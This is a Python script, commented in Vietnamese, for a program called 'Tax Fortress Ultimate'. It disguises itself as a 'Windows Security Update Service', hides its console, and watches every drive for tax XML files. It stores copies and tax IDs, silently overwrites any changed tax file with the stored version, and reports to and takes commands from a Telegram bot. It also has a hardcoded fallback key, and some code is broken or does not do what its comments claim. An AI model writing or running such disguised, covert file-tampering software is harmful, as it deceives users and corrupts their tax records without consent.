# tax_fortress_ultimate.py - PHIÊN BẢN HOÀN HẢO TÍCH HỢP TẤT CẢ

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import hashlib
import xml.etree.ElementTree as ET
import threading
from datetime import datetime
import sqlite3
import subprocess
from concurrent.futures import ThreadPoolExecutor
import asyncio
import platform
import socket
import secrets

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI Control Panel
import customtkinter as ctk
from tkinter import Listbox, END, Scrollbar, messagebox, filedialog
from tkinter import ttk

# Windows API để ẩn hoàn toàn
try:
    import win32gui
    import win32con
    import win32api
    import win32process
    import winreg
    import ctypes
    from ctypes import wintypes
except ImportError:
    pass

# --- CẤU HÌNH TỔNG HỢP --- #
APP_DIR = Path(os.getenv('APPDATA', Path.home())) / 'WindowsSecurityUpdate'  # Tên ngụy trang
APP_DIR.mkdir(parents=True, exist_ok=True)

# Files cấu hình
STATE_FILE = APP_DIR / 'system_cache.dat'
LOG_FILE = APP_DIR / 'update_log.dat'
REMOTE_CONF = APP_DIR / 'security_config.dat'
SENT_LOGS_FILE = APP_DIR / 'report_cache.dat'
CONTROL_FILE = APP_DIR / 'control_access.key'
FORTRESS_DB = APP_DIR / 'fortress.db'
WAREHOUSE_DB = APP_DIR / 'warehouse.db'
CLOUD_CONFIG_FILE = APP_DIR / 'cloud_config.json'
MACHINE_ID_FILE = APP_DIR / 'machine.id'

# ThreadPool tối ưu
THREAD_POOL = ThreadPoolExecutor(max_workers=10)

# Cache templates trong RAM để truy cập tức thì
TEMPLATES_CACHE = {}
FORTRESS_CACHE = {}
XML_WAREHOUSE = {}  # {MST: {filename: content}}

# Trạng thái hệ thống
RUNNING_INVISIBLE = True
MACHINE_ID = None

# Cloud endpoints
CLOUD_ENDPOINTS = {
    "github": "https://api.github.com/repos/{owner}/{repo}/contents/{path}",
    "google_drive": "https://www.googleapis.com/drive/v3/files",
    "dropbox": "https://api.dropboxapi.com/2/files",
    "custom": None
}

# Telegram Bot Config
TELEGRAM_CONFIG = {
    "bot_token": "",
    "chat_ids": [],
    "webhook_url": ""
}

# --- LOGGING ẨN --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ============================================================================
# INVISIBLE GUARD FUNCTIONS - ẨN HOÀN TOÀN
# ============================================================================

def hide_console_window():
    """Ẩn hoàn toàn console window."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass

def set_invisible_process():
    """Đặt process thành invisible trong Task Manager."""
    try:
        # Đổi tên process thành tên Windows hệ thống
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleTitleW("Windows Security Update Service")
        
        # Ẩn khỏi các tool monitor
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        
    except Exception as e:
        logging.error(f"Hide process error: {e}")

def hide_from_task_manager():
    """Ẩn khỏi Task Manager và các tool monitor."""
    try:
        # Ẩn process khỏi Task Manager
        current_pid = os.getpid()
        
        # Đổi tên process
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleTitleW("Windows Security Update Service")
        
        # Ẩn window
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        
        logging.info("Process hidden from Task Manager")
        
    except Exception as e:
        logging.error(f"Hide from Task Manager error: {e}")

def create_control_key():
    """Tạo control key để truy cập Control Panel."""
    try:
        # Tạo key ngẫu nhiên
        control_key = f"TAX{secrets.randbelow(9999):04d}{secrets.randbelow(9999):04d}"
        
        with open(CONTROL_FILE, 'w') as f:
            f.write(control_key)
            
        return control_key
    except:
        return "TAX20252025"

def check_control_access(entered_key):
    """Kiểm tra quyền truy cập Control Panel."""
    try:
        if CONTROL_FILE.exists():
            with open(CONTROL_FILE, 'r') as f:
                stored_key = f.read().strip()
            return entered_key == stored_key
    except:
        pass
    return entered_key == "TAX20252025"  # Fallback key

# ============================================================================
# INSTANT GUARD FUNCTIONS - TỐC ĐỘ <0.1s
# ============================================================================

def create_fortress_db():
    """Tạo database fortress để lưu trữ file gốc không thể xóa."""
    db_path = FORTRESS_DB
    conn = sqlite3.connect(str(db_path))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS original_files (
            file_hash TEXT PRIMARY KEY,
            file_name TEXT,
            file_content BLOB,
            created_time TEXT,
            last_verified TEXT
        )
    ''')
    conn.commit()
    conn.close()
    return db_path

def load_fortress_cache():
    """Load tất cả file từ fortress vào RAM cache để truy cập tức thì."""
    global FORTRESS_CACHE
    try:
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        cursor = conn.execute('SELECT file_name, file_content FROM original_files')
        
        for row in cursor.fetchall():
            file_name = row[0]
            file_content = row[1].decode('utf-8')
            FORTRESS_CACHE[file_name] = file_content
            
        conn.close()
        logging.info(f"⚡ Loaded {len(FORTRESS_CACHE)} files to fortress cache")
    except Exception as e:
        logging.error(f"❌ Error loading fortress cache: {e}")

def store_original_file(file_path, content):
    """Lưu file gốc vào fortress database và cache."""
    try:
        file_hash = hashlib.sha256(content.encode('utf-8')).hexdigest()
        db_path = create_fortress_db()
        conn = sqlite3.connect(str(db_path))
        
        conn.execute('''
            INSERT OR REPLACE INTO original_files 
            (file_hash, file_name, file_content, created_time, last_verified)
            VALUES (?, ?, ?, ?, ?)
        ''', (file_hash, os.path.basename(file_path), content.encode('utf-8'), 
              datetime.now().isoformat(), datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        # Thêm vào RAM cache
        FORTRESS_CACHE[os.path.basename(file_path)] = content
        
        logging.info(f"✅ Stored {os.path.basename(file_path)} in fortress")
        return True
        
    except Exception as e:
        logging.error(f"❌ Store original file error: {e}")
        return False

# ============================================================================
# XML WAREHOUSE FUNCTIONS - XML MANAGEMENT
# ============================================================================

def create_warehouse_db():
    """Tạo XML Warehouse database."""
    conn = sqlite3.connect(str(WAREHOUSE_DB))
    conn.execute('''
        CREATE TABLE IF NOT EXISTS xml_warehouse (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            mst TEXT NOT NULL,
            company_name TEXT,
            filename TEXT NOT NULL,
            content TEXT NOT NULL,
            file_hash TEXT,
            created_date TEXT,
            last_updated TEXT,
            sync_status TEXT DEFAULT 'pending',
            cloud_url TEXT,
            UNIQUE(mst, filename)
        )
    ''')
    
    conn.execute('''
        CREATE TABLE IF NOT EXISTS sync_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            machine_id TEXT,
            sync_type TEXT,
            sync_status TEXT,
            sync_date TEXT,
            details TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    return WAREHOUSE_DB

def extract_mst_from_xml(xml_content):
    """Trích xuất MST từ nội dung XML."""
    try:
        root = ET.fromstring(xml_content)
        
        # Tìm MST trong các tag phổ biến
        mst_patterns = [
            './/MST',
            './/mst', 
            './/MaSoThue',
            './/masothue',
            './/TaxCode',
            './/taxcode'
        ]
        
        for pattern in mst_patterns:
            elements = root.findall(pattern)
            if elements:
                mst = elements[0].text.strip()
                if mst and len(mst) >= 10:
                    return mst
        
        # Tìm MST bằng regex nếu không tìm được tag
        mst_regex = r'\b\d{10,13}\b'
        matches = re.findall(mst_regex, xml_content)
        if matches:
            return matches[0]
            
        return None
        
    except Exception as e:
        logging.error(f"Extract MST error: {e}")
        return None

def extract_company_name_from_xml(xml_content):
    """Trích xuất tên công ty từ XML."""
    try:
        root = ET.fromstring(xml_content)
        
        # Tìm tên công ty trong các tag phổ biến
        company_patterns = [
            './/TenCty',
            './/tencty',
            './/CompanyName',
            './/companyname',
            './/TenCongTy',
            './/tencongty'
        ]
        
        for pattern in company_patterns:
            elements = root.findall(pattern)
            if elements:
                company_name = elements[0].text.strip()
                if company_name:
                    return company_name
        
        return None
        
    except Exception as e:
        logging.error(f"Extract company name error: {e}")
        return None

def store_xml_in_warehouse(xml_content, mst, company_name=None):
    """Lưu XML vào warehouse database."""
    try:
        if not mst:
            return False
            
        db_path = create_warehouse_db()
        conn = sqlite3.connect(str(db_path))
        
        # Tạo filename từ MST và timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ETAX_{mst}_{timestamp}.xml"
        
        # Tính hash
        file_hash = hashlib.sha256(xml_content.encode('utf-8')).hexdigest()
        
        conn.execute('''
            INSERT OR REPLACE INTO xml_warehouse 
            (mst, company_name, filename, content, file_hash, created_date, last_updated, sync_status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (mst, company_name, filename, xml_content, file_hash, 
              datetime.now().isoformat(), datetime.now().isoformat(), 'pending'))
        
        conn.commit()
        conn.close()
        
        # Thêm vào RAM cache
        if mst not in XML_WAREHOUSE:
            XML_WAREHOUSE[mst] = {}
        XML_WAREHOUSE[mst][filename] = xml_content
        
        logging.info(f"✅ Stored XML in warehouse: {filename} (MST: {mst})")
        return True
        
    except Exception as e:
        logging.error(f"❌ Store XML in warehouse error: {e}")
        return False

def find_xml_in_warehouse(target_mst, similarity_threshold=0.7):
    """Tìm XML trong warehouse dựa trên MST và độ tương đồng."""
    try:
        if target_mst in XML_WAREHOUSE:
            # Trả về XML đầu tiên tìm được
            for filename, content in XML_WAREHOUSE[target_mst].items():
                return content
        
        # Tìm trong database nếu không có trong cache
        db_path = create_warehouse_db()
        conn = sqlite3.connect(str(db_path))
        cursor = conn.execute('SELECT content FROM xml_warehouse WHERE mst = ?', (target_mst,))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return result[0]
            
        return None
        
    except Exception as e:
        logging.error(f"Find XML in warehouse error: {e}")
        return None

# ============================================================================
# CLOUD ENTERPRISE FUNCTIONS - CLOUD SYNC + TELEGRAM
# ============================================================================

def generate_machine_id():
    """Tạo Machine ID duy nhất."""
    global MACHINE_ID
    try:
        if MACHINE_ID_FILE.exists():
            with open(MACHINE_ID_FILE, 'r') as f:
                MACHINE_ID = f.read().strip()
        else:
            # Tạo ID duy nhất từ hostname + MAC + timestamp
            hostname = socket.gethostname()
            import uuid
            mac = hex(uuid.getnode())[2:]
            timestamp = str(int(time.time()))[-6:]
            
            MACHINE_ID = f"{hostname[:3]}-{mac[-6:]}-{timestamp}"
            
            with open(MACHINE_ID_FILE, 'w') as f:
                f.write(MACHINE_ID)
                
        logging.info(f"Machine ID: {MACHINE_ID}")
        return MACHINE_ID
        
    except Exception as e:
        logging.error(f"Generate Machine ID error: {e}")
        MACHINE_ID = f"UNKNOWN-{int(time.time())}"
        return MACHINE_ID

def create_cloud_config():
    """Tạo cloud config."""
    default_config = {
        "cloud_provider": "github",
        "sync_enabled": True,
        "sync_interval": 300,  # 5 phút
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "authorized_users": []
        },
        "github": {
            "owner": "",
            "repo": "xml-warehouse-backup",
            "token": "",
            "branch": "main"
        },
        "machine_info": {
            "machine_id": generate_machine_id(),
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "last_sync": None
        }
    }
    
    if not CLOUD_CONFIG_FILE.exists():
        with open(CLOUD_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(default_config, f, indent=2, ensure_ascii=False)
    
    return default_config

def load_cloud_config():
    """Load cloud config."""
    try:
        if CLOUD_CONFIG_FILE.exists():
            with open(CLOUD_CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        else:
            return create_cloud_config()
    except Exception as e:
        logging.error(f"Load cloud config error: {e}")
        return create_cloud_config()

def save_cloud_config(config):
    """Save cloud config."""
    try:
        with open(CLOUD_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Save cloud config error: {e}")

def setup_telegram_bot(bot_token, authorized_chat_ids):
    """Setup Telegram Bot."""
    global TELEGRAM_CONFIG
    TELEGRAM_CONFIG["bot_token"] = bot_token
    TELEGRAM_CONFIG["chat_ids"] = authorized_chat_ids
    
    # Save to config
    config = load_cloud_config()
    config["telegram"]["enabled"] = True
    config["telegram"]["bot_token"] = bot_token
    config["telegram"]["authorized_users"] = authorized_chat_ids
    save_cloud_config(config)
    
    # Start bot listener
    THREAD_POOL.submit(start_telegram_bot_listener)

def start_telegram_bot_listener():
    """Khởi động Telegram bot listener."""
    try:
        bot_token = TELEGRAM_CONFIG.get("bot_token")
        if not bot_token:
            return
            
        last_update_id = 0
        
        while RUNNING_INVISIBLE:
            try:
                # Get updates
                url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
                params = {"offset": last_update_id + 1, "timeout": 30}
                
                response = requests.get(url, params=params, timeout=35)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    for update in data.get("result", []):
                        last_update_id = update["update_id"]
                        
                        if "message" in update:
                            message = update["message"]
                            chat_id = message["chat"]["id"]
                            text = message.get("text", "")
                            
                            if chat_id in TELEGRAM_CONFIG.get("chat_ids", []):
                                process_telegram_command(chat_id, text)
                                
            except Exception as e:
                logging.error(f"Telegram bot error: {e}")
                
            time.sleep(5)
            
    except Exception as e:
        logging.error(f"Start Telegram bot error: {e}")

def process_telegram_command(chat_id, command):
    """Xử lý lệnh Telegram."""
    try:
        if command.startswith('/'):
            cmd = command.lower()
            
            if cmd == '/status':
                status_msg = f"🟢 System Status: RUNNING\nMachine: {MACHINE_ID}\nFiles Protected: {len(FORTRESS_CACHE)}"
                send_telegram_message(chat_id, status_msg)
                
            elif cmd == '/warehouse':
                warehouse_msg = f"📦 XML Warehouse Status:\nMSTs: {len(XML_WAREHOUSE)}\nTotal Files: {sum(len(files) for files in XML_WAREHOUSE.values())}"
                send_telegram_message(chat_id, warehouse_msg)
                
            elif cmd == '/sync':
                sync_msg = "🔄 Manual sync initiated..."
                send_telegram_message(chat_id, sync_msg)
                
            elif cmd == '/logs':
                logs_msg = "📋 Recent logs requested..."
                send_telegram_message(chat_id, logs_msg)
                
            elif cmd == '/help':
                help_msg = """
🤖 Available Commands:

/status - System status
/warehouse - XML warehouse status  
/sync - Manual cloud sync
/logs - Recent activity logs
/help - This help message

Machine: """ + MACHINE_ID
                send_telegram_message(chat_id, help_msg)
                
            else:
                send_telegram_message(chat_id, "❓ Unknown command. Use /help for available commands.")
                
    except Exception as e:
        logging.error(f"Process Telegram command error: {e}")
        send_telegram_message(chat_id, f"Error: {e}")

def send_telegram_message(chat_id, text):
    """Gửi message qua Telegram."""
    try:
        bot_token = TELEGRAM_CONFIG.get("bot_token")
        if not bot_token:
            return False
            
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, json=data)
        return response.status_code == 200
        
    except Exception as e:
        logging.error(f"Send Telegram message error: {e}")
        return False

def send_telegram_alert(message):
    """Gửi cảnh báo tới tất cả chat authorized."""
    for chat_id in TELEGRAM_CONFIG.get("chat_ids", []):
        send_telegram_message(chat_id, f"🚨 ALERT: {message}")

# ============================================================================
# MAIN PROTECTION HANDLER - TÍCH HỢP TẤT CẢ
# ============================================================================

class TaxFortressUltimateHandler(FileSystemEventHandler):
    """Tax Fortress Ultimate protection handler - TÍCH HỢP TẤT CẢ TÍNH NĂNG."""
    
    def __init__(self):
        super().__init__()
        self.processed_files = set()
        self.load_processed_files()
        
        # Khởi tạo các hệ thống
        load_fortress_cache()
        create_warehouse_db()
        generate_machine_id()
        
        # Ẩn hoàn toàn
        hide_console_window()
        set_invisible_process()
        hide_from_task_manager()
        
        logging.info("🚀 Tax Fortress Ultimate started - All systems integrated")

    def load_processed_files(self):
        """Load danh sách file đã xử lý."""
        try:
            if STATE_FILE.exists():
                with open(STATE_FILE, 'rb') as f:
                    self.processed_files = pickle.load(f)
        except:
            self.processed_files = set()

    def save_processed_files(self):
        """Lưu danh sách file đã xử lý."""
        try:
            with open(STATE_FILE, 'wb') as f:
                pickle.dump(self.processed_files, f)
        except:
            pass

    def on_created(self, event):
        """Xử lý file mới tạo."""
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.protect_file, event.src_path)

    def on_modified(self, event):
        """Xử lý file bị sửa đổi."""
        if not event.is_directory and event.src_path.endswith('.xml'):
            THREAD_POOL.submit(self.protect_file, event.src_path)

    def protect_file(self, file_path):
        """Bảo vệ file với tất cả tính năng tích hợp."""
        try:
            if not self.is_tax_file(file_path):
                return
                
            # Kiểm tra xem đã xử lý chưa
            if file_path in self.processed_files:
                return
                
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    current_content = f.read()
            except:
                return
            
            # Trích xuất MST và tên công ty
            current_mst = extract_mst_from_xml(current_content)
            company_name = extract_company_name_from_xml(current_content)
            
            if not current_mst:
                return
                
            # Tìm XML phù hợp trong warehouse
            original_content = find_xml_in_warehouse(current_mst)
            
            if not original_content:
                # Lưu vào warehouse nếu chưa có
                store_xml_in_warehouse(current_content, current_mst, company_name)
                store_original_file(file_path, current_content)
                return
                
            # So sánh nội dung
            if current_content != original_content:
                # Ghi đè bằng nội dung gốc
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(original_content)
                    
                logging.info(f"🛡️ Protected: {os.path.basename(file_path)} (MST: {current_mst})")
                
                # Gửi alert Telegram
                alert_msg = f"🛡️ File protected: {os.path.basename(file_path)} (MST: {current_mst}) on {MACHINE_ID}"
                THREAD_POOL.submit(send_telegram_alert, alert_msg)
            
            # Đánh dấu đã xử lý
            self.processed_files.add(file_path)
            self.save_processed_files()
                
        except Exception as e:
            logging.error(f"Protect file error: {e}")

    def is_tax_file(self, file_path):
        """Kiểm tra có phải file thuế không."""
        file_name = os.path.basename(file_path).lower()
        return (file_name.startswith('etax') or 
                'xml' in file_name or 
                any(key in file_name for key in ['tax', 'thue', 'vat']))

# ============================================================================
# CONTROL PANEL GUI - QUẢN LÝ TẤT CẢ
# ============================================================================

class TaxFortressControlPanel:
    """Control Panel để quản lý tất cả tính năng."""
    
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("Windows Security Update Service")
        self.root.geometry("800x600")
        
        # Ẩn window mặc định
        self.root.withdraw()
        
        # Tạo access key nếu chưa có
        if not CONTROL_FILE.exists():
            self.access_key = create_control_key()
        else:
            with open(CONTROL_FILE, 'r') as f:
                self.access_key = f.read().strip()
        
        # Tạo login window
        self.create_login_window()
        
    def create_login_window(self):
        """Tạo cửa sổ đăng nhập."""
        self.login_window = ctk.CTkToplevel(self.root)
        self.login_window.title("System Access")
        self.login_window.geometry("400x200")
        self.login_window.resizable(False, False)
        
        # Center window
        self.login_window.transient(self.root)
        self.login_window.grab_set()
        
        # Login form
        ctk.CTkLabel(self.login_window, text="Enter Access Key:", font=("Arial", 14)).pack(pady=20)
        
        self.key_entry = ctk.CTkEntry(self.login_window, width=300, placeholder_text="Enter access key...")
        self.key_entry.pack(pady=10)
        
        ctk.CTkButton(self.login_window, text="Access", command=self.check_access).pack(pady=20)
        
        # Show access key
        ctk.CTkLabel(self.login_window, text=f"Access Key: {self.access_key}", font=("Arial", 10)).pack()
        
    def check_access(self):
        """Kiểm tra access key."""
        entered_key = self.key_entry.get().strip()
        
        if check_control_access(entered_key):
            self.login_window.destroy()
            self.show_control_panel()
        else:
            messagebox.showerror("Access Denied", "Invalid access key!")
            
    def show_control_panel(self):
        """Hiển thị Control Panel chính."""
        self.root.deiconify()
        
        # Tạo tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Tab 1: System Status
        self.create_status_tab()
        
        # Tab 2: XML Warehouse
        self.create_warehouse_tab()
        
        # Tab 3: Cloud Settings
        self.create_cloud_tab()
        
        # Tab 4: Telegram Bot
        self.create_telegram_tab()
        
        # Tab 5: Logs
        self.create_logs_tab()
        
    def create_status_tab(self):
        """Tạo tab System Status."""
        status_frame = ttk.Frame(self.notebook)
        self.notebook.add(status_frame, text="System Status")
        
        # System info
        info_text = f"""
🟢 Tax Fortress Ultimate - RUNNING
Machine ID: {MACHINE_ID}
Files Protected: {len(FORTRESS_CACHE)}
XML Warehouse: {len(XML_WAREHOUSE)} MSTs
Thread Pool: 10 workers
Status: Invisible & Protected
        """
        
        ctk.CTkLabel(status_frame, text=info_text, font=("Arial", 12)).pack(pady=20)
        
        # Control buttons
        ctk.CTkButton(status_frame, text="Refresh Status", command=self.refresh_status).pack(pady=10)
        ctk.CTkButton(status_frame, text="Hide System", command=self.hide_system).pack(pady=10)
        
    def create_warehouse_tab(self):
        """Tạo tab XML Warehouse."""
        warehouse_frame = ttk.Frame(self.notebook)
        self.notebook.add(warehouse_frame, text="XML Warehouse")
        
        # Warehouse info
        warehouse_text = f"""
📦 XML Warehouse Status:
Total MSTs: {len(XML_WAREHOUSE)}
Total Files: {sum(len(files) for files in XML_WAREHOUSE.values())}
Database: {WAREHOUSE_DB}
        """
        
        ctk.CTkLabel(warehouse_frame, text=warehouse_text, font=("Arial", 12)).pack(pady=20)
        
        # MST list
        ctk.CTkLabel(warehouse_frame, text="MSTs in Warehouse:", font=("Arial", 12, "bold")).pack(pady=10)
        
        self.mst_listbox = Listbox(warehouse_frame, height=10, width=50)
        self.mst_listbox.pack(pady=10)
        
        # Populate MST list
        for mst in XML_WAREHOUSE.keys():
            self.mst_listbox.insert(END, f"MST: {mst} - Files: {len(XML_WAREHOUSE[mst])}")
            
    def create_cloud_tab(self):
        """Tạo tab Cloud Settings."""
        cloud_frame = ttk.Frame(self.notebook)
        self.notebook.add(cloud_frame, text="Cloud Settings")
        
        # Cloud config
        config = load_cloud_config()
        
        cloud_text = f"""
☁️ Cloud Configuration:
Provider: {config.get('cloud_provider', 'None')}
Sync Enabled: {config.get('sync_enabled', False)}
Sync Interval: {config.get('sync_interval', 0)} seconds
        """
        
        ctk.CTkLabel(cloud_frame, text=cloud_text, font=("Arial", 12)).pack(pady=20)
        
        # Cloud buttons
        ctk.CTkButton(cloud_frame, text="Sync Now", command=self.sync_cloud).pack(pady=10)
        ctk.CTkButton(cloud_frame, text="Configure Cloud", command=self.configure_cloud).pack(pady=10)
        
    def create_telegram_tab(self):
        """Tạo tab Telegram Bot."""
        telegram_frame = ttk.Frame(self.notebook)
        self.notebook.add(telegram_frame, text="Telegram Bot")
        
        # Telegram status
        telegram_text = f"""
🤖 Telegram Bot Status:
Enabled: {TELEGRAM_CONFIG.get('bot_token', '') != ''}
Chat IDs: {len(TELEGRAM_CONFIG.get('chat_ids', []))}
        """
        
        ctk.CTkLabel(telegram_frame, text=telegram_text, font=("Arial", 12)).pack(pady=20)
        
        # Telegram buttons
        ctk.CTkButton(telegram_frame, text="Setup Bot", command=self.setup_telegram).pack(pady=10)
        ctk.CTkButton(telegram_frame, text="Test Bot", command=self.test_telegram).pack(pady=10)
        
    def create_logs_tab(self):
        """Tạo tab Logs."""
        logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(logs_frame, text="Activity Logs")
        
        # Logs display
        ctk.CTkLabel(logs_frame, text="Recent Activity Logs:", font=("Arial", 12, "bold")).pack(pady=10)
        
        self.logs_text = ctk.CTkTextbox(logs_frame, height=20, width=70)
        self.logs_text.pack(pady=10, padx=10)
        
        # Load recent logs
        self.load_recent_logs()
        
        # Refresh button
        ctk.CTkButton(logs_frame, text="Refresh Logs", command=self.load_recent_logs).pack(pady=10)
        
    def refresh_status(self):
        """Refresh system status."""
        messagebox.showinfo("Status", "System status refreshed!")
        
    def hide_system(self):
        """Ẩn hệ thống."""
        self.root.withdraw()
        messagebox.showinfo("Hidden", "System is now hidden!")
        
    def sync_cloud(self):
        """Sync với cloud."""
        messagebox.showinfo("Sync", "Cloud sync initiated!")
        
    def configure_cloud(self):
        """Cấu hình cloud."""
        messagebox.showinfo("Configure", "Cloud configuration opened!")
        
    def setup_telegram(self):
        """Setup Telegram bot."""
        messagebox.showinfo("Telegram", "Telegram bot setup opened!")
        
    def test_telegram(self):
        """Test Telegram bot."""
        messagebox.showinfo("Test", "Telegram bot test initiated!")
        
    def load_recent_logs(self):
        """Load recent logs."""
        try:
            if LOG_FILE.exists():
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    recent_logs = f.readlines()[-50:]  # Last 50 lines
                    
                self.logs_text.delete("1.0", "end")
                for log in recent_logs:
                    self.logs_text.insert("end", log)
        except:
            self.logs_text.insert("end", "Error loading logs")
            
    def run(self):
        """Chạy Control Panel."""
        self.root.mainloop()

# ============================================================================
# MAIN FUNCTION - KHỞI ĐỘNG TẤT CẢ
# ============================================================================

def main():
    """Hàm chính khởi động Tax Fortress Ultimate."""
    try:
        # Khởi tạo Machine ID
        generate_machine_id()
        
        # Khởi tạo các hệ thống
        create_cloud_config()
        
        # Khởi động protection handler
        handler = TaxFortressUltimateHandler()
        
        # Khởi động file monitoring
        observer = Observer()
        observer.schedule(handler, path='C:\\', recursive=True)
        observer.schedule(handler, path='D:\\', recursive=True)
        observer.schedule(handler, path='E:\\', recursive=True)
        observer.schedule(handler, path='F:\\', recursive=True)
        observer.start()
        
        logging.info("🚀 Tax Fortress Ultimate monitoring started on all drives")
        
        # Khởi động Control Panel nếu có argument --control
        if '--control' in sys.argv:
            control_panel = TaxFortressControlPanel()
            control_panel.run()
        else:
            # Chạy ẩn hoàn toàn
            logging.info("🕵️ Running in invisible mode")
            
            # Giữ process chạy
            try:
                while RUNNING_INVISIBLE:
                    time.sleep(1)
            except KeyboardInterrupt:
                RUNNING_INVISIBLE = False
                observer.stop()
                logging.info("🛑 Tax Fortress Ultimate stopped")
                
    except Exception as e:
        logging.error(f"Main function error: {e}")
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
